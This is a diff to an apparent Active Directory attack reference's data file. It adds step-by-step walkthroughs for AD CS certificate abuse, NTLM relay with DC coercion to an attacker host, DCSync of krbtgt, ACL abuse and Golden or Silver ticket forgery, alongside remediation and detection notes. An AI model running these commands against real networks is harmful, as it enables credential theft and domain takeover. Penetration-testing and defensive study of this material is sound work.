+              ["BloodHound", "Find write access over computer objects"]
+            ]
+          },
+          {
+            title: "References",
+            type: "references",
+            items: [
+              { label: "Hadess — Pwning the Domain: Kerberos Delegation (RBCD)", url: "https://hadess.io/" },
+              { label: "Elad Shamir — Wagging the Dog (RBCD)", url: "https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html" },
+              { label: "The Hacker Recipes — RBCD", url: "https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd" }
             ]
           },
           {
@@ -1551,8 +1719,8 @@ var VULNS = [
               "Set MachineAccountQuota to 0 so ordinary users cannot create the computer account the chain needs.",
               "Audit and tighten ACLs on computer objects; GenericWrite/GenericAll for non-admins is the enabling condition.",
               "Enforce LDAP signing and channel binding to close the relay route into RBCD setup.",
-              "Monitor changes to msDS-AllowedToActOnBehalfOfOtherIdentity.",
-              "Place Tier-0 accounts in Protected Users to limit impersonation."
+              "Place Tier-0 accounts in Protected Users to limit impersonation.",
+              "Detect: writes to msDS-AllowedToActOnBehalfOfOtherIdentity (event 5136) and new computer accounts created by user principals."
             ]
           }
         ]
@@ -1563,48 +1731,81 @@ var VULNS = [
         severity: "Critical",
         ref: "https://posts.specterops.io/certified-pre-owned-d95910965cd2",
         theory: "theory/2026-08-18-adcs.html",
-        description: "Misconfigured certificate templates or CA endpoints let an attacker obtain a certificate as anyone — then authenticate as them.",
-        brief: "Active Directory Certificate Services mints authentication. A certificate with a client-auth EKU can be exchanged for a Kerberos TGT via PKINIT, so any misconfiguration that lets you obtain a certificate for an identity you should not control is a path to becoming that identity — often a domain admin or a DC.\n\nThe ESC1–ESC8 classes catalogue these: enrollee-supplied subjects, dangerous template/CA rights, and NTLM relay to the CA web endpoint. Certipy finds and exploits them. See the AD CS theory page for detail.",
+        description: "Misconfigured certificate templates or CA endpoints let an attacker obtain a certificate as anyone, then authenticate as them via PKINIT — often the shortest path to Domain Admin.",
+        brief: "A certificate with a client-authentication EKU can be exchanged for a Kerberos TGT via PKINIT, so any AD CS misconfiguration that lets you enrol a certificate for an identity you should not control is a path to becoming that identity — frequently a domain admin or a DC.\n\nImpact: certificates are long-lived and survive password resets, making this both an escalation and a durable persistence primitive. The ESC1–ESC8 classes catalogue the misconfigurations; Certipy finds and exploits them.",
         quickReference: [
-          { label: "Find vulnerable templates", cmd: "certipy find -u user@corp.local -p pass -dc-ip <dc> -vulnerable" },
-          { label: "ESC1 — request as admin", cmd: "certipy req -u user@corp.local -p pass -ca CORP-CA -template Vuln -upn administrator@corp.local" },
-          { label: "Authenticate with the cert", cmd: "certipy auth -pfx administrator.pfx -dc-ip <dc>" },
-          { label: "ESC8 — relay to CA web", cmd: "ntlmrelayx.py -t http://ca/certsrv/certfnsh.asp --adcs --template DomainController" }
+          { label: "Find vulnerable templates/CAs", cmd: "certipy find -u jdoe@corp.local -p 'Passw0rd' -dc-ip 10.10.10.10 -vulnerable -stdout" },
+          { label: "ESC1 — request a cert as Administrator", cmd: "certipy req -u jdoe@corp.local -p 'Passw0rd' -ca CORP-CA -template VulnTemplate -upn administrator@corp.local" },
+          { label: "Authenticate with the cert (PKINIT → TGT + NT hash)", cmd: "certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10" },
+          { label: "ESC8 — relay a coerced DC to the CA web endpoint", cmd: "ntlmrelayx.py -t http://ca01/certsrv/certfnsh.asp -smb2support --adcs --template DomainController" }
         ],
         sections: [
+          {
+            title: "How It's Exploited (ESC1 walkthrough)",
+            type: "commands",
+            commands: [
+              { label: "1. Enumerate the CA and templates for misconfigurations", cmd: "certipy find -u jdoe@corp.local -p 'Passw0rd' -dc-ip 10.10.10.10 -vulnerable -stdout\n# flags each template's ESC condition (ESC1..ESC8) and who can enrol" },
+              { label: "2. ESC1 — the template lets the enrollee supply the subject (SAN)", cmd: "certipy req -u jdoe@corp.local -p 'Passw0rd' -dc-ip 10.10.10.10 \\\n  -ca CORP-CA -template VulnTemplate -upn administrator@corp.local\n#   -upn administrator@corp.local  request the cert AS the domain admin\n#   the client-auth EKU + ENROLLEE_SUPPLIES_SUBJECT makes this possible\n# outputs administrator.pfx" },
+              { label: "3. Authenticate with the certificate via PKINIT", cmd: "certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10\n# returns a TGT for Administrator AND (via UnPAC-the-hash) their NT hash" },
+              { label: "4. ESC8 — coerce a DC and relay its auth to the CA web endpoint", cmd: "# terminal 1: relay to the certsrv web enrolment, ask for a DC-template cert\nntlmrelayx.py -t http://ca01/certsrv/certfnsh.asp -smb2support --adcs --template DomainController\n# terminal 2: coerce the DC's machine account to authenticate to us\nPetitPotam.py -u jdoe -p 'Passw0rd' attacker_ip dc01_ip\n# a DC certificate comes back -> certipy auth -pfx dc01.pfx -> DC TGT" },
+              { label: "5. Use the identity", cmd: "certipy auth -pfx administrator.pfx   # or dc01.pfx\nexport KRB5CCNAME=administrator.ccache\nsecretsdump.py -k -no-pass dc01.corp.local" }
+            ]
+          },
           {
             title: "Key ESC Classes",
             type: "table",
             columns: ["ESC", "Misconfiguration"],
             rows: [
-              ["ESC1", "Template lets the enrollee supply the subject (SAN) + client-auth EKU + low-priv enrolment"],
+              ["ESC1", "Template: enrollee supplies subject (SAN) + client-auth EKU + low-priv enrol → request as anyone"],
               ["ESC2/3", "Any-Purpose / Enrollment Agent templates usable to authenticate as others"],
-              ["ESC4", "Write access to a template object — reconfigure it into ESC1"],
-              ["ESC6", "CA flag EDITF_ATTRIBUTESUBJECTALTNAME2 lets any request set a SAN"],
-              ["ESC7", "Dangerous rights over the CA itself (ManageCA/ManageCertificates)"],
-              ["ESC8", "CA web enrolment accepts NTLM without EPA — relay a coerced DC for a cert"]
+              ["ESC4", "Write access to a template object → reconfigure it into ESC1"],
+              ["ESC6", "CA flag EDITF_ATTRIBUTESUBJECTALTNAME2 → any request can set a SAN"],
+              ["ESC7", "Dangerous rights over the CA itself (ManageCA / ManageCertificates)"],
+              ["ESC8", "CA web enrolment accepts NTLM without EPA → relay a coerced DC for a cert"]
             ]
           },
           {
-            title: "Impact",
+            title: "Attack Chain",
             type: "table",
-            columns: ["Outcome", "Detail"],
+            columns: ["Step", "Action", "Result"],
             rows: [
-              ["Domain compromise", "Obtain a certificate as a DC/admin, then a TGT"],
-              ["Durable persistence", "Certificates are long-lived and survive password resets"],
-              ["Auth bypass", "PKINIT authentication without knowing any password"],
-              ["UnPAC-the-hash", "Recover the target's NT hash from the PKINIT exchange"]
+              ["1", "certipy find -vulnerable", "The exploitable ESC condition on a template/CA"],
+              ["2", "Request a certificate for a privileged identity", "A .pfx as Administrator / a DC"],
+              ["3", "certipy auth (PKINIT)", "TGT + NT hash of that identity"],
+              ["4", "(ESC8) coerce DC + relay to CA", "DC certificate without any template misconfig"],
+              ["5", "DCSync / act as the identity", "Domain compromise + durable cert persistence"]
+            ]
+          },
+          {
+            title: "Tools Used",
+            type: "table",
+            columns: ["Tool", "Purpose"],
+            rows: [
+              ["Certipy", "Enumerate (find) and exploit (req/auth) every ESC class"],
+              ["ntlmrelayx.py", "--adcs relay to the CA web endpoint (ESC8)"],
+              ["PetitPotam / Coercer", "Coerce a DC to authenticate for the relay"],
+              ["Impacket secretsdump.py", "DCSync with the resulting TGT"],
+              ["Certify / Rubeus", "Windows-side enrolment and PKINIT"]
+            ]
+          },
+          {
+            title: "References",
+            type: "references",
+            items: [
+              { label: "SpecterOps — Certified Pre-Owned", url: "https://posts.specterops.io/certified-pre-owned-d95910965cd2" },
+              { label: "Certipy wiki — ESC1–ESC16", url: "https://github.com/ly4k/Certipy/wiki" },
+              { label: "The Hacker Recipes — AD CS", url: "https://www.thehacker.recipes/ad/movement/ad-cs" }
             ]
           },
           {
             title: "Remediation",
             type: "notes",
             items: [
-              "Audit templates and the CA with Certipy/PSPKIAudit; remove ENROLLEE_SUPPLIES_SUBJECT where not required.",
-              "Enforce Extended Protection for Authentication (EPA) and disable NTLM on the CA web enrolment endpoint (fixes ESC8).",
-              "Restrict enrolment rights and CA management rights to the minimum (addresses ESC4/ESC7).",
-              "Require manager approval on sensitive templates and enable certificate issuance logging.",
-              "Clear the EDITF_ATTRIBUTESUBJECTALTNAME2 flag on the CA (fixes ESC6)."
+              "Audit templates and the CA with Certipy/PSPKIAudit; remove ENROLLEE_SUPPLIES_SUBJECT where not genuinely required (ESC1).",
+              "Enforce EPA and disable NTLM on the CA web enrolment endpoint (ESC8).",
+              "Restrict template enrolment rights and CA management rights to the minimum (ESC4/ESC7).",
+              "Clear the EDITF_ATTRIBUTESUBJECTALTNAME2 flag on the CA (ESC6); require manager approval on sensitive templates.",
+              "Detect: certificates issued for a privileged SAN to a low-priv requester; enable CA issuance logging."
             ]
           }
         ]
@@ -1615,35 +1816,65 @@ var VULNS = [
         severity: "Critical",
         ref: "https://attack.mitre.org/techniques/T1003/006/",
         theory: "theory/2026-08-18-dcsync.html",
-        description: "An attacker with replication rights asks a DC to replicate secrets, extracting any hash — including krbtgt.",
-        brief: "DCSync abuses the legitimate directory-replication protocol (MS-DRSR) that domain controllers use to sync with each other. Any principal holding the replication rights — DS-Replication-Get-Changes and Get-Changes-All on the domain object — can request an account's secrets from a DC without running code on it or touching NTDS.dit on disk.\n\nThe prize is the krbtgt key, which enables Golden Tickets and durable domain persistence. Replication rights are just ACEs, so a non-admin who is granted them is a straight line to full compromise. See the DCSync theory page.",
+        description: "A principal with replication rights asks a DC to replicate secrets, extracting any account's hashes — including krbtgt — without running code on the DC.",
+        brief: "DCSync abuses the legitimate directory-replication protocol (MS-DRSR) that DCs use to sync with each other. Any principal holding DS-Replication-Get-Changes and Get-Changes-All on the domain object can request an account's secrets from a DC — over the network, with no code execution on the DC and no touching of NTDS.dit on disk.\n\nImpact: the prize is the krbtgt key, which enables Golden Tickets and durable domain persistence. Because replication rights are just ACEs, a non-admin granted them is a straight line to full compromise.",
         quickReference: [
-          { label: "Dump everything (Impacket)", cmd: "secretsdump.py -just-dc corp.local/admin:pass@dc01" },
-          { label: "Just krbtgt", cmd: "secretsdump.py -just-dc-user krbtgt corp.local/admin:pass@dc01" },
-          { label: "NetExec", cmd: "netexec smb dc01 -u admin -p pass --ntds" },
+          { label: "Dump everything (Impacket)", cmd: "secretsdump.py -just-dc corp.local/admin:'Passw0rd'@dc01" },
+          { label: "Just krbtgt", cmd: "secretsdump.py -just-dc-user krbtgt corp.local/admin:'Passw0rd'@dc01" },
+          { label: "NetExec", cmd: "netexec smb dc01 -u admin -p 'Passw0rd' --ntds" },
           { label: "Mimikatz", cmd: "lsadump::dcsync /domain:corp.local /user:krbtgt" }
         ],
         sections: [
           {
-            title: "Preconditions",
-            type: "table",
-            columns: ["Item", "Detail"],
-            rows: [
-              ["Requires", "DS-Replication-Get-Changes + Get-Changes-All on the domain object"],
-              ["Held by default", "Domain Admins, Enterprise Admins, and DCs"],
-              ["The risk", "A non-admin granted these rights (an ACL finding) can DCSync"],
-              ["Stealth", "No interactive logon or code execution on the DC; looks like replication"]
+            title: "How It's Exploited",
+            type: "commands",
+            commands: [
+              { label: "1. Confirm you hold replication rights on the domain object", cmd: "# BloodHound edge: DCSync / GetChanges + GetChangesAll on the domain\n# these come with Domain Admin, or can be granted directly to any principal (an ACL win)" },
+              { label: "2. Replicate the krbtgt secret from a DC", cmd: "secretsdump.py -just-dc-user krbtgt corp.local/admin:'Passw0rd'@dc01\n#   -just-dc-user krbtgt   pull only the krbtgt account's hashes\n# note the NTLM hash AND the aes256 key for the Golden Ticket" },
+              { label: "3. Or replicate every account (full NTDS over the wire)", cmd: "secretsdump.py -just-dc corp.local/admin:'Passw0rd'@dc01 -outputfile ntds\n# never touches NTDS.dit on disk; looks like normal DC replication" },
+              { label: "4. Turn krbtgt into durable persistence (Golden Ticket)", cmd: "ticketer.py -nthash <krbtgt_nthash> -domain-sid <domain_sid> -domain corp.local Administrator\nexport KRB5CCNAME=Administrator.ccache   # forge TGTs for anyone, survives password resets" }
             ]
           },
           {
-            title: "Impact",
+            title: "Rights That Permit It",
             type: "table",
-            columns: ["Target", "Consequence"],
+            columns: ["Right", "Purpose"],
             rows: [
-              ["krbtgt hash", "Forge Golden Tickets — durable, domain-wide persistence"],
-              ["All user hashes", "Complete credential set for cracking and pass-the-hash"],
-              ["Trust keys", "Move across domain/forest trusts"],
-              ["Domain compromise", "Effectively total control"]
+              ["DS-Replication-Get-Changes", "Replicate standard directory data"],
+              ["DS-Replication-Get-Changes-All", "Replicate SECRET attributes — the one that yields hashes"],
+              ["Held by default", "Domain Admins, Enterprise Admins, and DCs"],
+              ["The real risk", "A non-admin principal granted these via an ACL"]
+            ]
+          },
+          {
+            title: "Attack Chain",
+            type: "table",
+            columns: ["Step", "Action", "Result"],
+            rows: [
+              ["1", "Obtain a principal with replication rights", "DCSync capability"],
+              ["2", "Request krbtgt (and/or all) secrets from a DC", "Hashes without touching the DC disk"],
+              ["3", "Pass-the-hash / crack DA hashes", "Immediate high privilege"],
+              ["4", "Forge a Golden Ticket with the krbtgt key", "Durable, domain-wide persistence"]
+            ]
+          },
+          {
+            title: "Tools Used",
+            type: "table",
+            columns: ["Tool", "Purpose"],
+            rows: [
+              ["Impacket secretsdump.py", "DCSync over MS-DRSR (-just-dc)"],
+              ["NetExec", "--ntds convenience wrapper"],
+              ["Mimikatz", "lsadump::dcsync from a Windows host"],
+              ["Impacket ticketer.py", "Forge a Golden Ticket from the krbtgt key"],
+              ["BloodHound", "Find non-admins that hold replication rights"]
+            ]
+          },
+          {
+            title: "References",
+            type: "references",
+            items: [
+              { label: "MITRE ATT&CK T1003.006 — DCSync", url: "https://attack.mitre.org/techniques/T1003/006/" },
+              { label: "The Hacker Recipes — DCSync", url: "https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync" }
             ]
           },
           {
@@ -1651,10 +1882,10 @@ var VULNS = [
             type: "notes",
             items: [
               "Audit replication rights on the domain object; only DCs and top-tier admins should hold Get-Changes-All.",
-              "Monitor for DRSGetNCChanges (replication) requests originating from non-DC hosts — the primary detection.",
-              "Rotate the krbtgt password twice (with a replication interval between) after any suspected DA compromise.",
+              "Rotate the krbtgt password twice (with a replication interval between) after any suspected Tier-0 compromise.",
               "Protect Tier-0 accounts and keep them off lower-tier systems.",
-              "Alert on unexpected new domain controller objects (catches DCShadow)."
+              "Detect: DRSGetNCChanges (replication) requests from source IPs that are not domain controllers — the primary signal.",
+              "Alert on unexpected new DC objects (catches the DCShadow write-side variant)."
             ]
           }
         ]
@@ -1665,48 +1896,79 @@ var VULNS = [
         severity: "High",
         ref: "https://bloodhound.readthedocs.io/",
         theory: "theory/2026-08-18-acls-dacls.html",
-        description: "Over-permissive object permissions (GenericAll, WriteDACL, ForceChangePassword) chain into paths to Domain Admin.",
-        brief: "Access to AD objects is governed by ACLs, and a small set of rights can be turned into control of the object they sit on — GenericAll, GenericWrite, WriteDACL, WriteOwner, ForceChangePassword, AddMember. In a large domain these accumulate over years, and a single misconfigured ACE can be the first link in a multi-hop path from a low-priv foothold to Domain Admin.\n\nBloodHound exists to compute exactly these chains. See the ACLs & DACLs theory page for how each right converts to compromise.",
+        description: "Over-permissive object permissions (GenericAll, WriteDACL, ForceChangePassword) chain across objects into a path to Domain Admin.",
+        brief: "Access to AD objects is governed by ACLs, and a small set of rights can be turned into control of the object they sit on. In a large domain these accumulate for years, and a single misconfigured ACE can be the first link in a multi-hop path from a low-priv foothold to Domain Admin.\n\nImpact: BloodHound computes these chains automatically; each dangerous right converts to password reset, group addition, targeted Kerberoast/AS-REP, RBCD, Shadow Credentials, or DCSync.",
         quickReference: [
-          { label: "Find paths (BloodHound)", cmd: "Collect with SharpHound/bloodhound-python, run 'Shortest Path to Domain Admins'" },
-          { label: "Reset a password (ForceChangePassword)", cmd: "bloodyAD -u user -p pass -d corp.local set password TARGET 'NewPass123!'" },
-          { label: "Add self to a group (GenericAll/AddMember)", cmd: "bloodyAD -u user -p pass -d corp.local add groupMember 'Helpdesk Admins' user" },
-          { label: "Grant DCSync (WriteDACL on domain)", cmd: "Add replication rights, then DCSync" }
+          { label: "Find paths (BloodHound)", cmd: "SharpHound / bloodhound-python -> 'Shortest Path to Domain Admins'" },
+          { label: "Reset a password (ForceChangePassword)", cmd: "bloodyAD -u jdoe -p 'Passw0rd' -d corp.local set password TARGET 'NewPass123!'" },
+          { label: "Add self to a group (GenericAll/AddMember)", cmd: "bloodyAD -u jdoe -p 'Passw0rd' -d corp.local add groupMember 'Helpdesk Admins' jdoe" },
+          { label: "Grant yourself DCSync (WriteDACL on domain)", cmd: "dacledit.py -action write -rights DCSync -principal jdoe -target-dn 'DC=corp,DC=local' corp.local/jdoe:'Passw0rd'" }
         ],
         sections: [
+          {
+            title: "How It's Exploited",
+            type: "commands",
+            commands: [
+              { label: "1. Map outbound control from your foothold", cmd: "# collect then, in BloodHound, mark your user Owned and run:\n#   Shortest Path from Owned Principals / Outbound Object Control\n# each edge (GenericAll, WriteDacl, ForceChangePassword, AddMember...) is an action" },
+              { label: "2. ForceChangePassword — take over a user", cmd: "bloodyAD -u jdoe -p 'Passw0rd' -d corp.local set password TARGET 'NewPass123!'\n# then authenticate as TARGET" },
+              { label: "3. GenericWrite over a user — targeted Kerberoast or Shadow Credentials", cmd: "# add an SPN and roast:\nbloodyAD -u jdoe -p pass -d corp.local set object TARGET servicePrincipalName -v 'fake/svc'\n# or write a Shadow Credential (no password reset needed):\npywhisker -d corp.local -u jdoe -p pass --target TARGET --action add" },
+              { label: "4. GenericAll over a computer — RBCD to full takeover", cmd: "# see the RBCD entry: write msDS-AllowedToActOnBehalfOfOtherIdentity and impersonate" },
+              { label: "5. WriteDACL over the domain — grant yourself DCSync", cmd: "dacledit.py -action write -rights DCSync -principal jdoe \\\n  -target-dn 'DC=corp,DC=local' corp.local/jdoe:'Passw0rd'\n# then secretsdump.py -just-dc" }
+            ]
+          },
           {
             title: "Dangerous Rights",
             type: "table",
             columns: ["Right", "Turns into"],
             rows: [
               ["GenericAll", "Full control — reset password, add SPN, write any attribute"],
-              ["GenericWrite", "Targeted Kerberoast (add SPN), Shadow Credentials, logon-script abuse"],
-              ["WriteDACL", "Grant yourself GenericAll, then anything"],
-              ["WriteOwner", "Take ownership, rewrite the DACL"],
+              ["GenericWrite", "Targeted Kerberoast, Shadow Credentials, logon-script abuse"],
+              ["WriteDACL", "Grant yourself GenericAll or DCSync, then anything"],
+              ["WriteOwner", "Take ownership, then rewrite the DACL"],
               ["ForceChangePassword", "Reset the target's password without the current one"],
-              ["Replication rights (domain)", "DCSync the whole domain"]
+              ["AddMember", "Add yourself to a privileged group"]
             ]
           },
           {
-            title: "Why It Chains",
+            title: "Attack Chain",
             type: "table",
-            columns: ["Concept", "Detail"],
+            columns: ["Step", "Action", "Result"],
             rows: [
-              ["Rarely direct", "You seldom have a right over DA directly"],
-              ["Multi-hop", "GenericWrite on a service account -> roast -> its rights -> next hop -> DA"],
-              ["Nested groups", "A right granted to a broad group applies to everyone nested inside"],
-              ["AdminSDHolder", "Modifying it propagates a malicious ACE to all protected accounts (persistence)"]
+              ["1", "BloodHound outbound control from foothold", "The dangerous ACE and the path"],
+              ["2", "Exercise the first right (reset / add SPN / add member)", "Control of the next principal"],
+              ["3", "Repeat across the chain", "Escalation hop by hop"],
+              ["4", "Reach a Tier-0 right (WriteDACL on domain / group)", "DCSync or Domain Admin membership"]
+            ]
+          },
+          {
+            title: "Tools Used",
+            type: "table",
+            columns: ["Tool", "Purpose"],
+            rows: [
+              ["BloodHound / SharpHound", "Compute the ACL attack paths"],
+              ["bloodyAD", "Reset passwords, add group members, write attributes"],
+              ["Impacket dacledit.py", "Grant rights / DCSync via ACL edits"],
+              ["pyWhisker", "Shadow Credentials via msDS-KeyCredentialLink"],
+              ["PowerView", "Enumerate and abuse ACLs from Windows"]
+            ]
+          },
+          {
+            title: "References",
+            type: "references",
+            items: [
+              { label: "BloodHound docs — edges/abuse", url: "https://bloodhound.readthedocs.io/" },
+              { label: "The Hacker Recipes — ACL abuse", url: "https://www.thehacker.recipes/ad/movement/dacl" }
             ]
           },
           {
             title: "Remediation",
             type: "notes",
             items: [
-              "Run BloodHound yourself and remediate the dangerous edges and shortest paths to Tier-0.",
-              "Apply least privilege on delegation — grant the narrowest right over the smallest scope, avoid GenericAll.",
-              "Monitor DACL modifications (event 5136) on sensitive objects and watch AdminSDHolder.",
+              "Run BloodHound yourself and prune the dangerous edges and shortest paths to Tier-0.",
+              "Apply least privilege on delegation of administration — grant the narrowest right over the smallest scope.",
               "Adopt a tiered administration model so a low-tier ACL win cannot reach high-tier accounts.",
-              "Review and prune inherited and legacy ACEs regularly."
+              "Monitor DACL modifications (event 5136) on sensitive objects and watch AdminSDHolder for persistence.",
+              "Review and remove inherited/legacy ACEs regularly."
             ]
           }
         ]
@@ -1717,35 +1979,67 @@ var VULNS = [
         severity: "High",
         ref: "https://attack.mitre.org/techniques/T1557/001/",
         theory: "theory/2026-08-18-coercion-ntlm-relay.html",
-        description: "Authentication is captured or coerced, then relayed to a service missing its relay protection (SMB, LDAP, AD CS).",
-        brief: "NTLM relay takes an authentication a victim was tricked into starting and forwards it, live, to a service that will accept it — acting as the victim there. Coercion makes it reliable: certain RPC methods force a target (ideally a domain controller's machine account) to authenticate on command.\n\nRelaying succeeds only where a protection is missing — SMB signing off, LDAP channel binding off, or EPA not enforced on AD CS web enrolment. Coercing a DC and relaying to AD CS (ESC8) is a leading path to domain compromise. See the Coercion & NTLM Relay theory page.",
+        description: "Authentication is captured or coerced, then relayed live to a service missing its relay protection (SMB, LDAP, AD CS) to act as the victim.",
+        brief: "NTLM relay takes an authentication a victim was tricked into starting and forwards it, in real time, to a service that will accept it — acting as the victim there. Coercion makes it reliable: certain RPC methods force a target (ideally a DC's machine account) to authenticate on command.\n\nImpact: relaying succeeds only where a protection is missing — SMB signing off, LDAP channel binding off, or EPA not enforced on AD CS web enrolment. Coercing a DC and relaying to AD CS (ESC8) is a leading path to domain compromise.",
         quickReference: [
-          { label: "Poison to capture/relay", cmd: "responder -I eth0    (turn off SMB/HTTP to relay instead)" },
-          { label: "Coerce a host to authenticate", cmd: "coercer coerce -t dc01 -l attacker_ip -u user -p pass -d corp.local" },
-          { label: "Relay to LDAP for RBCD", cmd: "ntlmrelayx.py -t ldap://dc01 --delegate-access" },
-          { label: "Find unsigned SMB targets", cmd: "netexec smb 10.0.0.0/24 --gen-relay-list targets.txt" }
+          { label: "Find SMB targets without signing", cmd: "netexec smb 10.0.0.0/24 --gen-relay-list targets.txt" },
+          { label: "Poison + capture/relay", cmd: "responder -I eth0 -A   (analyze) ; set SMB/HTTP Off to relay" },
+          { label: "Relay to LDAP for RBCD", cmd: "ntlmrelayx.py -t ldap://dc01 --delegate-access -smb2support" },
+          { label: "Coerce a host to authenticate", cmd: "coercer coerce -t dc01 -l attacker_ip -u jdoe -p 'Passw0rd' -d corp.local" }
         ],
         sections: [
+          {
+            title: "How It's Exploited",
+            type: "commands",
+            commands: [
+              { label: "1. Enumerate relay targets (missing protection is the whole game)", cmd: "# hosts without SMB signing are relayable:\nnetexec smb 10.0.0.0/24 --gen-relay-list targets.txt" },
+              { label: "2. Stand up the relay, then generate the authentication", cmd: "# relay to SMB targets and drop to an interactive session on success\nntlmrelayx.py -tf targets.txt -smb2support -i\n# obtain the auth by poisoning (Responder) or by coercion (below)" },
+              { label: "3. Coerce a DC to authenticate to you (deterministic)", cmd: "coercer coerce -t dc01 -l attacker_ip -u jdoe -p 'Passw0rd' -d corp.local\n#   -t target to coerce, -l where it should authenticate back to\n# sprays MS-RPRN/MS-EFSRPC/MS-DFSNM/MS-FSRVP" },
+              { label: "4. ESC8 — relay the DC's auth to AD CS for a certificate", cmd: "ntlmrelayx.py -t http://ca01/certsrv/certfnsh.asp -smb2support --adcs --template DomainController\n# the DC cert -> certipy auth -> DC TGT -> domain compromise" },
+              { label: "5. Or relay to LDAP and configure RBCD on the coerced machine", cmd: "ntlmrelayx.py -t ldap://dc01 --delegate-access -smb2support\n# then getST.py -impersonate Administrator against the coerced host" }
+            ]
+          },
           {
             title: "Relay Targets & Conditions",
             type: "table",
             columns: ["Target", "Requires / yields"],
             rows: [
-              ["SMB", "SMB signing NOT required -> SAM/LSA dump, execution"],
-              ["LDAP/LDAPS", "Channel binding off -> RBCD, Shadow Credentials, DCSync rights"],
-              ["AD CS web (ESC8)", "EPA not enforced -> a certificate as the victim -> a TGT"],
+              ["SMB", "SMB signing NOT required → SAM/LSA dump, command execution"],
+              ["LDAP / LDAPS", "Channel binding off → RBCD, Shadow Credentials, DCSync rights"],
+              ["AD CS web (ESC8)", "EPA not enforced → a certificate as the victim → a TGT"],
               ["Rule", "You cannot relay auth back to the host it came from — relay elsewhere"]
             ]
           },
           {
-            title: "Coercion Vectors",
+            title: "Attack Chain",
             type: "table",
-            columns: ["Method", "Protocol"],
+            columns: ["Step", "Action", "Result"],
             rows: [
-              ["PrinterBug", "MS-RPRN (print spooler)"],
-              ["PetitPotam", "MS-EFSRPC (encrypting file system)"],
-              ["DFSCoerce", "MS-DFSNM"],
-              ["ShadowCoerce", "MS-FSRVP"]
+              ["1", "Find a service missing its relay protection", "A valid relay target"],
+              ["2", "Coerce/poison a victim to authenticate to you", "Live NTLM authentication in hand"],
+              ["3", "Relay it to the target (SMB/LDAP/AD CS)", "Action as the victim"],
+              ["4", "ESC8: DC auth → CA cert; or LDAP → RBCD", "DC TGT / host takeover"],
+              ["5", "DCSync / impersonate", "Domain compromise"]
+            ]
+          },
+          {
+            title: "Tools Used",
+            type: "table",
+            columns: ["Tool", "Purpose"],
+            rows: [
+              ["Responder", "LLMNR/NBT-NS poisoning to capture/relay"],
+              ["Coercer / PetitPotam / PrinterBug", "Force a target to authenticate on demand"],
+              ["Impacket ntlmrelayx.py", "Relay the authentication to SMB/LDAP/AD CS"],
+              ["NetExec", "--gen-relay-list to find unsigned SMB hosts"],
+              ["Certipy", "Turn a relayed AD CS certificate into a TGT"]
+            ]
+          },
+          {
+            title: "References",
+            type: "references",
+            items: [
+              { label: "MITRE ATT&CK T1557.001 — LLMNR/NBT-NS Poisoning and Relay", url: "https://attack.mitre.org/techniques/T1557/001/" },
+              { label: "The Hacker Recipes — NTLM relay", url: "https://www.thehacker.recipes/ad/movement/ntlm/relay" }
             ]
           },
           {
@@ -1756,58 +2050,88 @@ var VULNS = [
               "Enforce LDAP channel binding and signing to close the RBCD/Shadow-Credential relay paths.",
               "Enable EPA on AD CS web enrolment and disable NTLM there to kill ESC8.",
               "Disable the Print Spooler on DCs and disable LLMNR/NBT-NS to remove coercion and poisoning triggers.",
-              "Patch coercion methods, though new vectors appear — the layered signing/EPA controls are the durable fix."
+              "Detect: authentication from a DC machine account to an unexpected host; patch coercion methods as they appear."
             ]
           }
         ]
       },
       {
         id: "kerberos-ticket-attacks",
-        name: "Golden & Silver Tickets",
+        name: "Golden, Silver & Diamond Tickets",
         severity: "Critical",
         ref: "https://attack.mitre.org/techniques/T1558/001/",
-        theory: "theory/2026-08-18-ticket-attacks.html",
-        description: "With stolen key material, forge Kerberos tickets — a Silver ticket for one service, a Golden ticket for the whole domain.",
-        brief: "Once key material is stolen, an attacker stops requesting tickets and starts forging them. A Silver Ticket is a forged service ticket, made with a service account's key, accepted by that one service without contacting the DC. A Golden Ticket is a forged TGT, made with the krbtgt key, that lets the attacker impersonate anyone across the whole domain and survives password resets.\n\nThese are the persistence endgame of AD compromise — which is why krbtgt theft means the domain must be considered fully compromised. See the Ticket Attacks theory page.",
+        theory: "theory/2026-08-18-kerberos.html",
+        description: "With stolen key material, forge Kerberos tickets — a Silver ticket for one service, a Golden ticket for the whole domain, a Diamond ticket to evade detection.",
+        brief: "Once key material is stolen, an attacker stops requesting tickets and forges them. A Silver Ticket is a forged service ticket (from a service account key), accepted by that one service without contacting the DC. A Golden Ticket is a forged TGT (from the krbtgt key) that impersonates anyone domain-wide and survives password resets. A Diamond Ticket modifies a real TGT to look legitimate.\n\nImpact: these are the persistence endgame of AD compromise — which is why krbtgt theft means the domain must be considered fully compromised until krbtgt is rotated twice.",
         quickReference: [
-          { label: "Golden Ticket", cmd: "ticketer.py -nthash <krbtgt_hash> -domain-sid <sid> -domain corp.local Administrator" },
-          { label: "Silver Ticket", cmd: "ticketer.py -nthash <service_hash> -domain-sid <sid> -domain corp.local -spn cifs/srv01 Administrator" },
-          { label: "Pass-the-Ticket", cmd: "export KRB5CCNAME=ticket.ccache   (then use -k -no-pass)" },
-          { label: "Overpass-the-Hash", cmd: "getTGT.py corp.local/user -hashes :<nthash>" }
+          { label: "Golden Ticket (krbtgt key)", cmd: "ticketer.py -nthash <krbtgt_hash> -domain-sid <sid> -domain corp.local Administrator" },
+          { label: "Silver Ticket (service key)", cmd: "ticketer.py -nthash <service_hash> -domain-sid <sid> -domain corp.local -spn cifs/srv01 Administrator" },
+          { label: "Overpass-the-Hash (NT hash → TGT)", cmd: "getTGT.py corp.local/svc -hashes :<nthash>" },
+          { label: "Pass-the-Ticket", cmd: "export KRB5CCNAME=ticket.ccache   (then -k -no-pass)" }
         ],
         sections: [
+          {
+            title: "How It's Exploited",
+            type: "commands",
+            commands: [
+              { label: "1. Overpass-the-Hash — turn an NT hash into a real TGT", cmd: "getTGT.py corp.local/svc -hashes :<nthash>\nexport KRB5CCNAME=svc.ccache\n# from here you use Kerberos, which looks entirely normal" },
+              { label: "2. Silver Ticket — forge a service ticket with a service/computer key", cmd: "ticketer.py -nthash <service_or_machine_hash> -domain-sid <domain_sid> \\\n  -domain corp.local -spn cifs/srv01.corp.local Administrator\n#   -spn        the single service the ticket is valid for\n# the KDC is never contacted at use time -> minimal telemetry" },
